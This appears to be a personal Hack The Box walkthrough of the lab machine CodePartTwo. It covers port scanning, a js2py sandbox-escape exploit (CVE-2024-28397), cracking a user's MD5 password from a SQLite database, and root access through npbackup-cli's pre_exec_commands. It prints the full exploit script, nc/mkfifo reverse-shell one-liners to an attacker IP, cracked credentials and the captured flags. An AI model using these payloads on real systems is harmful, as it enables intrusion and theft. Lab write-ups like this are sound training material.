---
title: "CodePartTwo - Hack The Box"
date: 2026-02-06
description: "My walkthrough for CodePartTwo machine on HTB."
tags: ["Linux", "Easy"]
---
### Enumeration
```shell
sudo nmap -Pn -p- $IP -oN Codepart2
```

```
Nmap scan report for 10.129.132.190 (10.129.132.190)
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 735.82 seconds
```

```shell
sudo nmap -Pn -p 22,8000 -sCV $IP -oN Codepart2_services
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 23:08 +01
Nmap scan report for 10.129.132.190 (10.129.132.190)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
```
### Port 8000
- If we navigate to `10.129.130.223:8000`, We find a website that is an online JavaScript editor where we can create, save and manage our JS code. We can also download the source code of the application if we want to contribute to it.
- Let's create a user and see what features the application offers :

![JS online editor](Images/JS%20online%20editor.png)

![Trying online editor](Images/Trying%20online%20editor.png)

- I wanted to know more about how the application works, so I went to analyze the source code. Since the code was written in `Python`, I forgot the fact that I am dealing with `JS Editor` and I went trying some `Python Reverse shells` but errors were showing up. Wait ! If the python is used as a backend, how is it possible it's a `JS Editor` ? `js2py` the library used was the answer. 

![js2py eval()](Images/js2py%20eval().png)

- In the `requirements.txt`, the version of `js2py` used is `0.74`. A quick google search shows that this version is vulnerable to `CVE-2024-28397`.

- For more information and analysis of the CVE : https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/analysis_en.md .

- The `PoC` I used was retrieved from this `GitHub` :  https://github.com/waleed-hassan569/CVE-2024-28397-command-execution-poc/blob/main/payload.js

```javascript
let cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.60 4444 >/tmp/f"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

// run the command and force UTF-8 string output
let proc = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true)
let out = proc.communicate()[0].decode("utf-8")

// return a plain string (JSON-safe)
"" + out
```
### Shell as app

![reverse shell as app](Images/reverse%20shell%20as%20app.png)

- In order to locate `user.txt` I run the following command :

```shell
find / -type f -name user.txt 2>/dev/null
```

- No result was returned, so I knew the file is one of the folders I don't have permissions to access.
- I checked the `/etc/passwd` to know the local users of the machine :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
marco:x:1000:1000:marco:/home/marco:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false
```

- Besides the user `app`, there is another user `marco`.

- Since we have already inspected the source code, we know that the users are stored in a database called `users.db`. The DBMS used is `sqlite3`

```shell
sqlite3 users.db
.tables #to display the tables in the database.
SELECT * FROM user;
.exit
```

- We found the password of `marco` hashed with `MD5`, we will crack it using `jTR`.

![users db](Images/users%20db.png)

![marco password hash](Images/marco%20password%20hash.png)

- `Credentials found : marco/sweetangelbabylove`
### Shell as marco
```shell
ssh marco@10.129.130.223
```

- Let's grab the `user.txt` and see what special privileges the user has : 

![Shell as Marco](Images/Shell%20as%20Marco.png)

Flag : **910765e95385a744836a3facfe85b984**
### Shell as root

- The user `Marco` can run `npbackup-cli` as `root`. In order to understand this solution, I started trying its commands : 

```shell
sudo /usr/local/bin/npbackup-cli #Was asked to specify a config file
sudo /usr/local/bin/npbackup-cli -c npbackup.conf #Was asked to specify an operation
sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b #Try the -b flag for backup
```

- I used the `--help` flag and I managed to see some interesting options such as `-b` for backup, `--dump` for dumping files, but unfortunately, due to my lack of familiarity with the tool, I couldn't make any noticeable progress with these options. So I thought of modifying the `config` file but sadly we do not have this permission. 

![NpBackup-cli help menu](Images/NpBackup-cli%20help%20menu.png)

![trying Npbackup-cli](Images/trying%20Npbackup-cli.png)

- My other attempt is to duplicate the config file and make some modifications in some attributes such as `repo_uri`, `paths` in `backup_opts` so they point to folders I control as `marco user`, for example the `repo_uri` could be */home/marco* and the `paths` could be */root/root.txt* but this config didn't work. 
- I also noticed that in order to preserve the `security` of the config file from disclosing sensitive information, the solution encrypts `repo_uri` and `repo_password`. I tried to decrypt these but without any result. 
- Upon further inspection, I managed to find two interesting attributes in the `config file` which are : **pre_exec_commands: []** and **post_exec_commands: []** I tried to insert `whoami` in the `pre_exec_command` in my new config file and it worked : 

```shell
sudo /usr/local/bin/npbackup-cli -c npbakup.conf -b #npbakup.conf is my own config file.
```

```YAML
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      .
    repo_group: default_group
    backup_opts:
      paths:
      - /home/marco
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        Emy1234
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 1 MiB
      pre_exec_commands: ["whoami"]
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

![whoami execution](Images/whoami%20execution.png)

- I changed `whoami` with a `reverse shell` and I got the `root.txt`

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.60 1234 >/tmp/f
```

![shell as root](Images/shell%20as%20root.png)
Flag : **70de32f8aed7220fc71df3026f8f3b12**
